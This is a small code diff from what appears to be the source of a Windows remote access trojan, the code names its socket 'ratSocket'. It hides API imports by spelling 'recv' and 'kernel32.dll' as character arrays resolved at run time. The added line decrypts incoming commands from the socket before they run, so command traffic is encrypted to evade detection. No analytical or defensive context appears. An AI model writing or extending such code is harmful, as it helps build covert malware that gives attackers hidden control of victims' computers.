@@ -580,7 +580,7 @@ WinMain(HINSTANCE hInstance,
 
 	char ca_recv[] = { 'r','e','c','v', 0 };
 	gf_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);
-
+	
 	//char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
 
 	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
@@ -604,6 +604,8 @@ WinMain(HINSTANCE hInstance,
 			OutputDebugStringA("Error receiving message.");
 #endif			
 		}
+
+		EncryptDecryptString(recvBuffer, SOCKET_BUFFER_SIZE);
 
 #if DEBUG				
 		OutputDebugStringA("Received command: ");
